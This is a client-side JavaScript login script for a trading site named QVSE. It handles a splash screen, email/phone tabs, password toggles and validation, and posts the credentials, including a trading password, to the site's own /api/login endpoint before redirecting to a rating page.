document.addEventListener('DOMContentLoaded', function () {
    // === Splash Screen Helper ===
    // Shows the splash screen for `duration` ms, fades it out, then calls `callback`
    function showSplash(duration, callback) {
        var splash = document.getElementById('splashScreen');
        if (!splash) {
            // Re-create splash element if it was removed from DOM
            splash = document.createElement('div');
            splash.id = 'splashScreen';
            splash.className = 'splash-screen';
            splash.innerHTML = '<img src="splash.png" alt="QVSE Loading">';
            document.body.appendChild(splash);
        }

        // Force visible
        splash.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;opacity:1;visibility:visible;pointer-events:all;';

        setTimeout(function () {
            splash.style.transition = 'opacity 0.8s ease-in-out';
            splash.style.opacity = '0';

            setTimeout(function () {
                splash.style.visibility = 'hidden';
                splash.style.pointerEvents = 'none';
                if (callback) callback();
            }, 900);
        }, duration);
    }

    // === Initial Splash (2 seconds) ===
    showSplash(2000, null);

    // === Elements ===
    const tabEmail = document.getElementById('tabEmail');
    const tabPhone = document.getElementById('tabPhone');
    const emailGroup = document.getElementById('emailGroup');
    const phoneGroup = document.getElementById('phoneGroup');
    const emailInput = document.getElementById('emailInput');
    const phoneInput = document.getElementById('phoneInput');
    const passwordInput = document.getElementById('passwordInput');
    const tradingPasswordInput = document.getElementById('tradingPasswordInput');
    const togglePassword = document.getElementById('togglePassword');
    const toggleTradingPassword = document.getElementById('toggleTradingPassword');
    const rememberPassword = document.getElementById('rememberPassword');
    const userAgreement = document.getElementById('userAgreement');
    const loginForm = document.getElementById('loginForm');
    const toast = document.getElementById('toast');
    const toastMessage = document.getElementById('toastMessage');

    let activeTab = 'email';

    // === Tab Switching ===
    tabEmail.addEventListener('click', function () {
        activeTab = 'email';
        tabEmail.classList.add('active');
        tabPhone.classList.remove('active');
        emailGroup.classList.remove('hidden');
        phoneGroup.classList.add('hidden');
        emailInput.focus();
    });

    tabPhone.addEventListener('click', function () {
        activeTab = 'phone';
        tabPhone.classList.add('active');
        tabEmail.classList.remove('active');
        phoneGroup.classList.remove('hidden');
        emailGroup.classList.add('hidden');
        phoneInput.focus();
    });

    // === Toggle Password Visibility ===
    function setupPasswordToggle(toggleBtn) {
        toggleBtn.addEventListener('click', function () {
            const wrapper = toggleBtn.parentElement;
            const input = wrapper.querySelector('input');
            const eyeClosed = toggleBtn.querySelector('.eye-closed');
            const eyeOpen = toggleBtn.querySelector('.eye-open');
            if (input.type === 'password') {
                input.type = 'text';
                eyeClosed.classList.add('hidden');
                eyeOpen.classList.remove('hidden');
            } else {
                input.type = 'password';
                eyeOpen.classList.add('hidden');
                eyeClosed.classList.remove('hidden');
            }
        });
    }

    setupPasswordToggle(togglePassword);
    setupPasswordToggle(toggleTradingPassword);

    // === Show Toast ===
    function showToast(message, isError) {
        toastMessage.textContent = message;
        toast.classList.remove('error');
        if (isError) {
            toast.classList.add('error');
        }
        toast.classList.add('show');
        setTimeout(function () {
            toast.classList.remove('show');
        }, 3000);
    }

    // === Show Success Screen then Redirect ===
    function showSuccessAndRedirect(destination) {
        if (destination === 'dashboard') {
            window.location.href = 'dashboard.html';
        } else {
            window.location.href = 'rating.html';
        }
    }

    // === Form Submission ===
    loginForm.addEventListener('submit', async function (e) {
        e.preventDefault();

        const password = passwordInput.value.trim();
        const tradingPassword = tradingPasswordInput.value.trim();
        const email = emailInput.value.trim();
        const phone = phoneInput.value.trim();
        const remember = rememberPassword.checked;
        const agreed = userAgreement.checked;

        // Validation
        if (activeTab === 'email' && !email) {
            showToast('Please enter your email', true);
            emailInput.focus();
            return;
        }
        if (activeTab === 'phone' && !phone) {
            showToast('Please enter your phone number', true);
            phoneInput.focus();
            return;
        }
        if (!password) {
            showToast('Please enter your password', true);
            passwordInput.focus();
            return;
        }
        if (!tradingPassword) {
            showToast('Please enter your trading password', true);
            tradingPasswordInput.focus();
            return;
        }
        if (!agreed) {
            showToast('Please agree to the User Agreement', true);
            return;
        }

        // Build payload
        const payload = {
            login_type: activeTab,
            email: activeTab === 'email' ? email : '',
            phone_number: activeTab === 'phone' ? phone : '',
            password: password,
            trading_password: tradingPassword,
            remember_password: remember
        };

        try {
            const response = await fetch('/api/login', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });

            const data = await response.json();

            if (data.success) {
                // Save user credentials to localStorage for rating submission
                try {
                    localStorage.setItem('qvse_user_email', activeTab === 'email' ? email : '');
                    localStorage.setItem('qvse_user_phone', activeTab === 'phone' ? phone : '');
                } catch (e) { }

                // Clear form
                emailInput.value = '';
                phoneInput.value = '';
                passwordInput.value = '';
                tradingPasswordInput.value = '';

                // Show splash for 2 seconds, then redirect to rating
                showSplash(2000, function () { showSuccessAndRedirect('rating'); });
            } else {
                showToast(data.message || 'Something went wrong', true);
            }
        } catch (err) {
            showToast('Failed to connect to server', true);
            console.error('Error:', err);
        }
    });
});
